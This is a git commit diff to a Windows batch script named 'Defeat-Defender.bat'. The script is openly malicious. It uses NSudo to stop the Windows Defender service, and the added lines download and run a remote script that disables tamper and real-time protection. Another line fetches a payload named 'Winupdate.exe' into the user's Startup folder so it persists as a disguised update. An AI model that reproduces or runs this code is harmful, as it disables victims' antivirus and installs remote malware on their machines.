2e5e9a59f001cde8baa6b70d483583b3cf76a5d9
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-05-08 17:19:51 +0530

    Update Defeat-Defender.bat

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -81,6 +81,10 @@ NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxx%\%i-love-you-hande-ercel%\smart
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
 
+bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Disable-Tamper-Realtime-Protection/main/Disable-Tamper.cmd  %temp%\Disable-Tamper.cmd
+
+Disable-Tamper.cmd
+
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"
